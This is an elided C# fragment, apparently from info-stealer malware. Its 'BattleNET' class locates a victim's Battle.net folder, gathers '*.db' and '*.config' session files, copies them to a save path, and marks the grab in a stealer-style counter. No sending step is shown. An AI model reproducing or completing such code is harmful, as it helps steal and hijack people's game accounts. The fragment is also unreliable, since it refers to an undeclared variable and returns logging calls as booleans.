    ...
    internal sealed class BattleNET
    {
        ...
        public static bool GetBattleNETSession(string sSavePath)
        {
            if (!Directory.Exists(path))
                return deepside.Logging.Log("BattleNET >> Session not found");
            ...
            try
            {
                ...
                foreach (string found in new string[2] { "*.db", "*.config" })
                {
                    ...
                    foreach (string file in extracted)
                    {
                        ...
                        catch (Exception ex) { return deepside.Logging.Log("BattleNET >> Failed copy file\n" + ex, false); }
                    }
                }

                Counter.BattleNET = true;
            } catch (Exception ex) { return deepside.Logging.Log("BattleNET >> Error\n" + ex, false); }
            return true;
        }
